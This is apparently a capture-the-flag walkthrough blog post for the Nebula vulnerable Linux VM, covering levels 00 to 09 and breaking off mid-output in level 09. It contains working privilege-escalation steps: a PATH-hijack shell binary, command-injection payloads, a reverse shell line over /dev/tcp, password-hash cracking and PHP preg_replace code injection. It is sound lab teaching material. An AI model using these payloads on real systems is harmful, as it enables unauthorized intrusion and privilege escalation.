<!DOCTYPE html>
<html>

  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>Exploit Education - Nebula Walkthrough</title>
  <meta name="description" content="This blog post contains a walkthrough of Nebula provided by  Exploit Education. Nebula is a vulnerable ISO which has a variety of Linux privilege escalation ...">
  
  <meta name="author" content="Sam Sanoop">
  <meta name="copyright" content="&copy; Sam Sanoop 2022">
  

  <!-- External libraries -->
  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.9.0/styles/monokai-sublime.min.css">
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightbox2/2.7.1/css/lightbox.css">

  <!-- Favicon and other icons (made with http://www.favicon-generator.org/) -->
  <link rel="shortcut icon" href="/assets/icons/favicon.ico" type="image/x-icon">
  <link rel="icon" href="/assets/icons/favicon.ico" type="image/x-icon">
  <link rel="apple-touch-icon" sizes="57x57" href="/assets/icons/apple-icon-57x57.png">
  <link rel="apple-touch-icon" sizes="60x60" href="/assets/icons/apple-icon-60x60.png">
  <link rel="apple-touch-icon" sizes="72x72" href="/assets/icons/apple-icon-72x72.png">
  <link rel="apple-touch-icon" sizes="76x76" href="/assets/icons/apple-icon-76x76.png">
  <link rel="apple-touch-icon" sizes="114x114" href="/assets/icons/apple-icon-114x114.png">
  <link rel="apple-touch-icon" sizes="120x120" href="/assets/icons/apple-icon-120x120.png">
  <link rel="apple-touch-icon" sizes="144x144" href="/assets/icons/apple-icon-144x144.png">
  <link rel="apple-touch-icon" sizes="152x152" href="/assets/icons/apple-icon-152x152.png">
  <link rel="apple-touch-icon" sizes="180x180" href="/assets/icons/apple-icon-180x180.png">
  <link rel="icon" type="image/png" sizes="192x192"  href="/assets/icons/android-icon-192x192.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/assets/icons/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="96x96" href="/assets/icons/favicon-96x96.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/assets/icons/favicon-16x16.png">
  <link rel="manifest" href="/assets/icons/manifest.json">
  <meta name="msapplication-TileColor" content="#ffffff">
  <meta name="msapplication-TileImage" content="/assets/icons/ms-icon-144x144.png">
  <meta name="theme-color" content="#ffffff">

  
  <!-- Facebook OGP cards -->
  <meta property="og:description" content="This blog post contains a walkthrough of Nebula provided by  Exploit Education. Nebula is a vulnerable ISO which has a variety of Linux privilege escalation ..." />
  <meta property="og:url" content="http://localhost:4000" />
  <meta property="og:site_name" content="üíª | Blog" />
  <meta property="og:title" content="Exploit Education - Nebula Walkthrough" />
  <meta property="og:type" content="website" />
  <meta property="og:image" content="http://localhost:4000/assets/exploiteducation/cover2.jpeg" />
  <meta property="og:image:type" content="image/png" />
  <meta property="og:image:width" content="612" />
  <meta property="og:image:height" content="605" />
  

  
  <!-- Twitter: card tags -->
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Exploit Education - Nebula Walkthrough">
  <meta name="twitter:description" content="This blog post contains a walkthrough of Nebula provided by  Exploit Education. Nebula is a vulnerable ISO which has a variety of Linux privilege escalation ...">
  <meta name="twitter:image" content="http://localhost:4000/assets/exploiteducation/cover2.jpeg">
  <meta name="twitter:url" content="http://localhost:4000">
  

  

  <!-- Site styles -->
  <link rel="stylesheet" href="/css/main.css">
  <link rel="canonical" href="http://localhost:4000/capture-the-flag/2019/09/17/10_Exploit_Education_Nebula_Walkthrough.html">
  <link rel="alternate" type="application/rss+xml" title="üíª | Blog" href="http://localhost:4000/feed.xml" />
</head>


  <body>

    <header class="navigation" role="banner">
  <div class="navigation-wrapper">
    <a href="/" class="logo">
      
      <img src="/assets/logo.png" alt="üíª | Blog">
      
    </a>
    <a href="javascript:void(0)" class="navigation-menu-button" id="js-mobile-menu">
      <i class="fa fa-bars"></i>
    </a>
    <nav role="navigation">
      <ul id="js-navigation-menu" class="navigation-menu show">
        
          
          <li class="nav-link"><a href="/about/">About</a>
          
        
          
        
          
        
          
        
          
          <li class="nav-link"><a href="/posts/">Posts</a>
          
        
          
        
          
        
          
        
          
        
          
        
      </ul>
    </nav>
  </div>
</header>


    <div class="page-content">
        <div class="post">

<div class="post-header-container has-cover" style="background-image: url(/assets/exploiteducation/cover2.jpeg);">
  <div class="scrim has-cover">
    <header class="post-header">
      <h1 class="title">Exploit Education - Nebula Walkthrough</h1>
      <p class="info">by <strong>snoopysecurity</strong></p>
    </header>
  </div>
</div>

<div class="wrapper">



<section class="post-meta">
  <div class="post-date">September 17, 2019</div>
  <div class="post-categories">
  in 
    
    <a href="/category/capture-the-flag">Capture-the-flag</a>
    
  
  </div>
</section>

<article class="post-content">
  <p>This blog post contains a walkthrough of Nebula provided by  <a href="https://exploit.education">Exploit Education</a>. Nebula is a vulnerable ISO which has a variety of Linux privilege escalation vulnerabilities. Some of these vulnerabilties includes issues such as SUID files, Permissions, Race conditions etc.</p>

<p>After running the ISO, each level can be accessed by sshing into port 22 with the username <code class="language-plaintext highlighter-rouge">{level}{levelno}</code>. Instructions regarding each level are also provided within https://exploit.education/nebula/.</p>

<h2 id="level00">Level00</h2>
<p><a href="https://exploit.education/nebula/level-00/">Link: https://exploit.education/nebula/level-00/</a></p>

<p>The goal of this level is to find a Set User ID program that will run as the ‚Äúflag00‚Äù account. SetUID, which stands for set user ID on execution, is a special type of file permission in Unix which permits users to run certain programs with escalated privileges.</p>

<p>In Unix/Linux, the ownership of files and directories is based on the default uid (user-id) and gid (group-id) of the user who created them. When running a program/process within Linux, this process/program has the privilege of the user that ran the program. A SetUID bit can be set on an executable which when executed, will then run under the context of the file owner rather than the user who ran the program. For example, if an executable has the setuid bit set on it, and it‚Äôs owned by root, when launched by a normal user, it will run with root privileges.</p>

<p>To find all SetUID binaries within a system, the find command can be used with the following arguments:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / -perm -u=s 2&gt;/dev/null
</code></pre></div></div>
<p>The <code class="language-plaintext highlighter-rouge">/</code> argument is specified to run the command from the top most directory, the <code class="language-plaintext highlighter-rouge">-perm</code> option can be used to find files with specific mode. Files with SetUID and SetGID all have different mode numbers. For example,  <code class="language-plaintext highlighter-rouge">g=w</code> will only match files which have mode <code class="language-plaintext highlighter-rouge">0020</code> since this is the mode number for files with group write permission set. The <code class="language-plaintext highlighter-rouge">-u=s</code> can be used to find files with the mode SetUID set. The <code class="language-plaintext highlighter-rouge">/bin/.../flag00</code> is provided to ignore all stdout errors by sending them to <code class="language-plaintext highlighter-rouge">dev/null</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level00@nebula:~$ find / -perm -u=s 2&gt;/dev/null
/bin/.../flag00
/bin/fusermount
/bin/mount
/bin/ping
/bin/ping6
/bin/su
/bin/umount
/sbin/mount.ecryptfs_private
/usr/bin/at
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/mtr
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/sudoedit
/usr/bin/traceroute6.iputils
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/pt_chown
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/sbin/pppd
/usr/sbin/uuidd
/rofs/bin/.../flag00
/rofs/bin/fusermount
/rofs/bin/mount
/rofs/bin/ping
/rofs/bin/ping6
/rofs/bin/su
/rofs/bin/umount
/rofs/sbin/mount.ecryptfs_private
/rofs/usr/bin/at
/rofs/usr/bin/chfn
/rofs/usr/bin/chsh
/rofs/usr/bin/gpasswd
/rofs/usr/bin/mtr
/rofs/usr/bin/newgrp
/rofs/usr/bin/passwd
/rofs/usr/bin/sudo
/rofs/usr/bin/sudoedit
/rofs/usr/bin/traceroute6.iputils
/rofs/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/rofs/usr/lib/eject/dmcrypt-get-device
/rofs/usr/lib/openssh/ssh-keysign
/rofs/usr/lib/pt_chown
/rofs/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/rofs/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/rofs/usr/sbin/pppd
/rofs/usr/sbin/uuidd
</code></pre></div></div>
<p>The <code class="language-plaintext highlighter-rouge">/bin/.../flag00</code> binary can now be run to get the flag.</p>

<p><img src="/assets/exploiteducation/nebula001.png" alt="alt text" title="image1" /></p>

<h2 id="level01">Level01</h2>
<p><a href="https://exploit.education/nebula/level-01/">Link: https://exploit.education/nebula/level-01/</a></p>

<p>Level01 provides you with source code of a program that allows arbitrary programs to be executed.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdio.h&gt;

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/usr/bin/env echo and now what?");
}

</code></pre></div></div>

<p>Running the binary within the flag01 folder gives the following output.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level01@nebula:~$ cd ../flag01
level01@nebula:/home/flag01$ ./flag01 
and now what?
</code></pre></div></div>
<p>ltrace can be used to debug this binary and understand its functionality. ltrace is a debugging utility which hooks into the dynamic loading system, allowing it to insert shims which display the parameters which the applications uses when making the call, and the return value which the library call reports. It is mainly used to trace Linux system calls.</p>

<p>The ltrace output below just explains the source in a functional way where it takes the current uid and gid of the user who executed the binary and</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level01@nebula:/home/flag01$ ltrace ./flag01 
level01@nebula:/home/flag01$ id
uid=1002(level01) gid=1002(level01) groups=1002(level01)
__libc_start_main(0x80484a4, 1, 0xbfc49744, 0x8048510, 0x8048580 &lt;unfinished ...&gt;
getegid()                                                        = 1002
geteuid()                                                        = 1002
setresgid(1002, 1002, 1002, 0x288324, 0x287ff4)                  = 0
setresuid(1002, 1002, 1002, 0x288324, 0x287ff4)                  = 0
system("/usr/bin/env echo and now what?"and now what?
 &lt;unfinished ...&gt;
--- SIGCHLD (Child exited) ---
&lt;... system resumed&gt; )                                           = 0
+++ exited (status 0) +++
</code></pre></div></div>
<p>Looking at the system call it makes, it is possible to change the path of the echo binary since it is relying on <code class="language-plaintext highlighter-rouge">/usr/bin/env</code> to find the full path of the <code class="language-plaintext highlighter-rouge">echo</code> binary. The <code class="language-plaintext highlighter-rouge">env</code> can be run to see what the PATH environment of a user is, generally it is something like <code class="language-plaintext highlighter-rouge">PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games</code>. This output is the list of folders that system checks when a user runs a binary without providing its full path.</p>

<p>So complete this challenge, you can change your PATH to be called from an folder that you have write access to such as <code class="language-plaintext highlighter-rouge">/home/level01/</code>, and then create a new binary call echo, or a symbolic link which will then execute the getflag binary.</p>

<p>Start by creating a file called echo.c within the tmp directory or a directory you have write and execute privileges to and paste the following code:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include&lt;stdio.h&gt;
#include&lt;stdlib.h&gt;

int main()
{
  system("/bin/bash");
}

</code></pre></div></div>
<p>This can then be compiled into a program as seen below.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level01@nebula:/tmp$ vi echo.c
level01@nebula:/tmp$ cc echo.c -o echo
</code></pre></div></div>

<p>Once you have a dummy echo program, you can then change your environment path to the <code class="language-plaintext highlighter-rouge">/tmp</code> directory, meaning everytime the system will check if a binary is within the tmp folder since it doesn‚Äôt know the full path. Now when running the flag01 binary this will run the dummy echo program and provide you a bash shell under the context of the flag01 user account. Then the <code class="language-plaintext highlighter-rouge">getflag</code> command can be executed.</p>

<p><img src="/assets/exploiteducation/nebula01.png" alt="alt text" title="image1" /></p>

<h2 id="level02">Level02</h2>
<p><a href="https://exploit.education/nebula/level-02/">Link: https://exploit.education/nebula/level-02/</a></p>

<p>Level 02 provides you with a program which takes a USER from an environment variable using <code class="language-plaintext highlighter-rouge">asprintf</code>. <code class="language-plaintext highlighter-rouge">asprint</code> is similar to <code class="language-plaintext highlighter-rouge">sprintf</code>, except that it dynamically allocates a string to hold the output, instead of putting the output in a buffer you allocate in advance. This is then given to the <code class="language-plaintext highlighter-rouge">system</code> function which invokes an operating system command with the provider ‚ÄúUSER‚Äù variable.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdio.h&gt;

int main(int argc, char **argv, char **envp)
{
  char *buffer;

  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  buffer = NULL;

  asprintf(&amp;buffer, "/bin/echo %s is cool", getenv("USER"));
  printf("about to call system(\"%s\")\n", buffer);
  
  system(buffer);
}
</code></pre></div></div>
<p>Similar to level01, the environment variable can be changed to something like <code class="language-plaintext highlighter-rouge">; /bin/sh</code> which when taken by the program and is executed as part of the <code class="language-plaintext highlighter-rouge">system</code> function results in command injection, successfully provided a shell in the context on flag02.</p>

<p><img src="/assets/exploiteducation/nebula002.png" alt="alt text" title="image2" /></p>

<h2 id="level03">Level03</h2>
<p><a href="https://exploit.education/nebula/level-03/">Link: https://exploit.education/nebula/level-03/</a></p>

<p>Level03 provides you with the following files. The hint in the challenge page explains that there is a crontab that is called every couple of minutes.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level03@nebula:/home/flag03$ la -la
total 6
drwxr-x--- 3 flag03 level03  103 2011-11-20 20:39 .
drwxr-xr-x 1 root   root     100 2012-08-27 07:18 ..
-rw-r--r-- 1 flag03 flag03   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag03 flag03  3353 2011-05-18 02:54 .bashrc
-rw-r--r-- 1 flag03 flag03   675 2011-05-18 02:54 .profile
drwxrwxrwx 2 flag03 flag03     3 2012-08-18 05:24 writable.d
-rwxr-xr-x 1 flag03 flag03    98 2011-11-20 21:22 writable.sh
level03@nebula:/home/flag03$ cat writable.sh 
#!/bin/sh

for i in /home/flag03/writable.d/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done

level03@nebula:/home/flag03$ ls -la writable.d/
total 0
drwxrwxrwx 2 flag03 flag03    3 2012-08-18 05:24 .
drwxr-x--- 3 flag03 level03 103 2011-11-20 20:39 ..

</code></pre></div></div>
<p>Looking through the files, the <code class="language-plaintext highlighter-rouge">writable.sh</code> shell script is world-write-executable and iterates through all files provided within the <code class="language-plaintext highlighter-rouge">/home/flag03/writable.d</code> directory and runs thats using the bash terminal. The <code class="language-plaintext highlighter-rouge">ulimit</code> command before the bash command controls the max processes per user limit. This just sets the get and set user limit to second 5. The <code class="language-plaintext highlighter-rouge">-x</code> argument before bash checks to see if a file is executable before executing it.</p>

<p>To solve this challenge, you can create a shell script similar to the following</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/bin/sh

/bin/getflag &gt;&gt; /home/flag03/writable.d/flag03.out
</code></pre></div></div>

<p>and wait for it to be executed to get the flag</p>

<p><img src="/assets/exploiteducation/nebula003.png" alt="alt text" title="image3" /></p>

<p>An alternative way to solve this solution is to create a shell script like the following <code class="language-plaintext highlighter-rouge">"bash -i &gt;&amp; /dev/tcp/192.168.1.8/8080 0&gt;&amp;1" &gt; shell.sh</code> and run <code class="language-plaintext highlighter-rouge">nc -lvp 8080</code> on your machine. When the shell script executes, it will then give you a reverse shell.</p>

<h2 id="level04">Level04</h2>
<p><a href="https://exploit.education/nebula/level-04/">Link: https://exploit.education/nebula/level-04/</a></p>

<p>Level04 requires you to read the token file, but the below code restricts the files that can be read.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;

int main(int argc, char **argv, char **envp)
{
  char buf[1024];
  int fd, rc;

  if(argc == 1) {
      printf("%s [file to read]\n", argv[0]);
      exit(EXIT_FAILURE);
  }

  if(strstr(argv[1], "token") != NULL) {
      printf("You may not access '%s'\n", argv[1]);
      exit(EXIT_FAILURE);
  }

  fd = open(argv[1], O_RDONLY);
  if(fd == -1) {
      err(EXIT_FAILURE, "Unable to open %s", argv[1]);
  }

  rc = read(fd, buf, sizeof(buf));
  
  if(rc == -1) {
      err(EXIT_FAILURE, "Unable to read fd %d", fd);
  }

  write(1, buf, rc);
}
</code></pre></div></div>
<p>The <code class="language-plaintext highlighter-rouge">read</code> function takes a system call used to read data into a buffer and the <code class="language-plaintext highlighter-rouge">write</code> function is a system call that is used to write data out of a buffer. The <code class="language-plaintext highlighter-rouge">strstr</code> is the function that does the check to see whether the file name matches the string ‚Äútoken‚Äù and provides an error if it is true. This function searches the given string in the specified main string and returns the pointer to the first occurrence of the given string.</p>

<p>An easy way to bypass this check is by creating a symlink which points to the token file and read this file using the <code class="language-plaintext highlighter-rouge">flag04</code> binary: <code class="language-plaintext highlighter-rouge">ln -s /home/flag04/token /home/flag04/test</code></p>

<p><img src="/assets/exploiteducation/nebula004.png" alt="alt text" title="image4" /></p>

<h2 id="level05">Level05</h2>
<p><a href="https://exploit.education/nebula/level-05/">Link: https://exploit.education/nebula/level-05/</a></p>

<p>Level 5 challenge description states that your are looking for weak directory permissions. Going to the flag05 directory and listing the directory for all files, a <code class="language-plaintext highlighter-rouge">.backup</code> directory can be seen. Inside this directory contains a .tgz file</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level05@nebula:~$ cd ../flag05/
level05@nebula:/home/flag05$ ls
level05@nebula:/home/flag05$ ls -la
total 5
drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 .
drwxr-xr-x 1 root   root     160 2012-08-27 07:18 ..
drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .backup
-rw-r--r-- 1 flag05 flag05   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag05 flag05  3353 2011-05-18 02:54 .bashrc
-rw-r--r-- 1 flag05 flag05   675 2011-05-18 02:54 .profile
drwx------ 2 flag05 flag05    70 2011-11-20 20:13 .ssh
level05@nebula:/home/flag05$ cd .backup/
level05@nebula:/home/flag05/.backup$ ls
backup-19072011.tgz

</code></pre></div></div>
<p>Extracting this tape archive file provides an ssh key, this ssh key can be used to ssh into the nebula system as the flag05 user.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level05@nebula:/tmp$ tar -xvzf backup-19072011.tgz 
.ssh/
.ssh/id_rsa.pub
.ssh/id_rsa
.ssh/authorized_keys
level05@nebula:/tmp$ ssh -i id_rsa flag05@192.168.1.3
</code></pre></div></div>

<p><img src="/assets/exploiteducation/nebula005.png" alt="alt text" title="image5" /></p>

<h2 id="level06">Level06</h2>
<p><a href="https://exploit.education/nebula/level-06/">Link: https://exploit.education/nebula/level-06/</a></p>

<p>This challenge states that the flag06 account credentials came from a legacy unix system.</p>

<p>Looking within the flag06 folder, no files can be found</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level06@nebula:/home/flag06$ ls -la
total 5
drwxr-x--- 2 flag06 level06   66 2011-11-20 20:51 .
drwxr-xr-x 1 root   root     200 2012-08-27 07:18 ..
-rw-r--r-- 1 flag06 flag06   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag06 flag06  3353 2011-05-18 02:54 .bashrc
-rw-r--r-- 1 flag06 flag06   675 2011-05-18 02:54 .profile
level06@nebula:/home/flag06$ 
</code></pre></div></div>
<p>However, since the hint states legacy unix system, the <code class="language-plaintext highlighter-rouge">/etc/passwd/</code> file can be checked.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level06@nebula:/home/flag06$ cat /etc/passwd | grep flag06
flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
level06@nebula:/home/flag06$ 
</code></pre></div></div>
<p>The password hash of the <code class="language-plaintext highlighter-rouge">flag06</code> user can be seen within the passwd file.</p>

<p>In legacy unix systems, password hashes of a user used to be stored within the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file, this was then changed because <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file are world readable by all users.</p>

<p>This password hash can then be cracked using John the ripper.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# cat hash.txt
flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
root@kali:~# john hash.txt --show
flag06:hello:993:993::/home/flag06:/bin/sh
1 password hash cracked, 0 left
</code></pre></div></div>

<p><img src="/assets/exploiteducation/nebula006.png" alt="alt text" title="image6" /></p>

<h2 id="level07">Level07</h2>
<p><a href="https://exploit.education/nebula/level-07/">Link: https://exploit.education/nebula/level-07/</a></p>

<p>The description for level07 states that a perl cgi script is in use that allows a user to ping hosts to see if they were reachable from a web server. The source of the program has also been provided.</p>

<p><img src="/assets/exploiteducation/nebula007-1.png" alt="alt text" title="image7-1" /></p>

<p>Looking at the CGI script, it takes a parameter called ‚ÄúHost‚Äù and inserts that as part of the ping command which then gets executed. This script is vulnerable to Command Injection.</p>

<p>The httpd config available within the <code class="language-plaintext highlighter-rouge">flag07</code> directory also specifies what port the CGI script is running on.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level07@nebula:/home/flag07$ ls
index.cgi  thttpd.conf
level07@nebula:/home/flag07$ cat thttpd.conf 
# /etc/thttpd/thttpd.conf: thttpd configuration file

# This file is for thttpd processes created by /etc/init.d/thttpd.
# Commentary is based closely on the thttpd(8) 2.25b manpage, by Jef Poskanzer.

# Specifies an alternate port number to listen on.
port=7007

# Specifies a directory to chdir() to at startup. This is merely a convenience -
# you could just as easily do a cd in the shell script that invokes the program.
dir=/home/flag07
</code></pre></div></div>

<p>By making a curl request and chaining a command using the <code class="language-plaintext highlighter-rouge">&amp;&amp;</code> operator, it is possible to verify the command injection. This can be seen in the output below.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>snoopy@snoopy-MacBookPro:~/Documents$ curl http://192.168.1.3:7007/index.cgi?Host=127.0.0.1%20%26%26%20whoami
&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_req=1 ttl=64 time=0.024 ms
64 bytes from 127.0.0.1: icmp_req=2 ttl=64 time=0.023 ms
64 bytes from 127.0.0.1: icmp_req=3 ttl=64 time=0.015 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 1998ms
rtt min/avg/max/mdev = 0.015/0.020/0.024/0.006 ms
flag07
</code></pre></div></div>

<p><img src="/assets/exploiteducation/nebula007.png" alt="alt text" title="image7" /></p>

<h2 id="level08">Level08</h2>
<p><a href="https://exploit.education/nebula/level-08/">Link: https://exploit.education/nebula/level-08/</a></p>

<p>Level 08 hints at World readable files being in use. Accessing the <code class="language-plaintext highlighter-rouge">flag08</code> shows that a pcap file is available. This can be downloaded and accessed locally.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>scp level08@192.168.1.3:/home/flag08/capture.pcap /home/snoopy/
</code></pre></div></div>

<p>Looking at this pcap file within Wireshark, the following can be seen.</p>

<p><img src="/assets/exploiteducation/nebula008-1.png" alt="alt text" title="image8-1" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>..wwwbugs login: l.le.ev.ve.el.l8.8
..
Password: backdoor...00Rm8.ate
</code></pre></div></div>

<p>A possible password is displayed, however it looks mangled. It was not possible to loging as <code class="language-plaintext highlighter-rouge">flag08</code> using <code class="language-plaintext highlighter-rouge">backdoor...00Rm8.ate</code> and <code class="language-plaintext highlighter-rouge">backdoor00Rm8ate</code>. Looking at the TCP/HTTP stream in HEX, the ASCII hex character <code class="language-plaintext highlighter-rouge">7f</code> and <code class="language-plaintext highlighter-rouge">Od</code> stands out.</p>

<p><img src="/assets/exploiteducation/nebula008-2.png" alt="alt text" title="image8-2" /></p>

<p>By looking up both characters online, it is possible to deduce that <code class="language-plaintext highlighter-rouge">7f</code> is the Delete keyboard character and <code class="language-plaintext highlighter-rouge">Od</code> is the keyboard character.</p>

<p>So the user typed in ‚Äòbackdoor‚Äô then deleted the characters ‚Äòoor‚Äô and the inserted ‚Äò00Rm8‚Äô, the character ‚Äò8‚Äô was then removed for ‚Äòa‚Äô, making the actual password <code class="language-plaintext highlighter-rouge">backd00Rmate</code></p>

<p><img src="/assets/exploiteducation/nebula008-02.png" alt="alt text" title="image8-03" /></p>

<h2 id="level09">Level09</h2>
<p><a href="https://exploit.education/nebula/level-09/">Link: https://exploit.education/nebula/level-09/</a></p>

<p>Level 09 provides the following source code.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php

function spam($email)
{
  $email = preg_replace("/\./", " dot ", $email);
  $email = preg_replace("/@/", " AT ", $email);
  
  return $email;
}

function markup($filename, $use_me)
{
  $contents = file_get_contents($filename);

  $contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);
  $contents = preg_replace("/\[/", "&lt;", $contents);
  $contents = preg_replace("/\]/", "&gt;", $contents);

  return $contents;
}

$output = markup($argv[1], $argv[2]);

print $output;

?&gt;
</code></pre></div></div>
<p>The above PHP code takes two arguments, <code class="language-plaintext highlighter-rouge">$filename</code> and <code class="language-plaintext highlighter-rouge">$use_me</code>, However, only the <code class="language-plaintext highlighter-rouge">$filename</code> parameter seems to be used. the file mentioned within the <code class="language-plaintext highlighter-rouge">filename</code> parameter is then fetched, and is checked to see if a an array called ‚Äòemail‚Äô is there, this can be verified by checking the provided regex:</p>

<p><img src="/assets/exploiteducation/nebula009-01.png" alt="alt text" title="image9-01" /></p>

<p>This is then ran by the <code class="language-plaintext highlighter-rouge">preg_replace</code> command to replace the dot and the @ symbols. Looking online, the following articles mention that <code class="language-plaintext highlighter-rouge">preg_replace</code> is vulnerable to command injection.</p>

<ul>
  <li>http://www.madirish.net/402</li>
  <li>https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace</li>
</ul>

<p>First try indicates that the values inserted within the <code class="language-plaintext highlighter-rouge">system</code> command is only being echoed back.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level09@nebula:/home/flag09$ vi /tmp/file.txt 
level09@nebula:/home/flag09$ ./flag09 /tmp/file.txt
PHP Notice:  Undefined offset: 2 in /home/flag09/flag09.php on line 22
snoopy AT foo dot com; system(\'whoami\')
level09@nebula:/home/flag09$ 
</code></pre></div></div>
<p>After trying multiple execution operators such as quotes, single quotes, backticks and much research, it looks like when providing a input similar to the below:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level09@nebula:/home/flag09$ cat /tmp/execute
$str = 'system(whoami)';
[email snoopy@foo.com $str] 
</code></pre></div></div>

<p>The script provides an error stating undefined variable.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level09@nebula:/home/flag09$ ./flag09 /tmp/execute foo
PHP Notice:  Undefined variable: str in /home/flag09/flag09.php(15) : regexp code on line 1
$str = 'system(whoami)';
snoopy AT foo dot com 
</code></pre></div></div>
<p>It seems variables cannot be set and cannot be  called later on since all of this is being executed within preg_replace and then provided to the <code class="language-plaintext highlighter-rouge">spam()</code> function.</p>

<p>More research indicated that interpolation templates can be used to define variables: <a href="https://stackoverflow.com/questions/43437121/php-string-interpolation-syntax/43437427">https://stackoverflow.com/questions/43437121/php-string-interpolation-syntax/43437427</a>. An example of this would be something like {$variable}. However, pre_replace is <code class="language-plaintext highlighter-rouge">eval</code>ing any input, we could just try passing it arbitrary commands.</p>

<p>Trying the following payload <code class="language-plaintext highlighter-rouge">[email snoopy@foo.com ${'whoami'}]</code> sets a template as a variable which is the linux command ‚Äòwhoami‚Äô. However, this returns an error.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level09@nebula:/home/flag09$ ./flag09 /tmp/execute aaa
PHP Parse error:  syntax error, unexpected T_ENCAPSED_AND_WHITESPACE, expecting T_STRING in /home/flag09/flag09.php(15) : regexp code on line 1
PHP Fatal error:  preg_replace(): Failed evaluating code: 
spam("snoopy@foo.com ${\'whoami\'}") in /home/flag09/flag09.php on line 15

</code></pre></div></div>

<p>This error is due to the single quotes in use, that can be replaced with backticks :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[email snoopy@foo.com ${`whoami`}]
</code></pre></div></div>

<p>This payloads gets successfully interpreted as a command displayed the user the script is running as which is ‚Äòflag09‚Äô.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level09@nebula:/home/flag09$ ./flag09 /tmp/execute aaa
PHP Notice:  Undefined variable: flag09
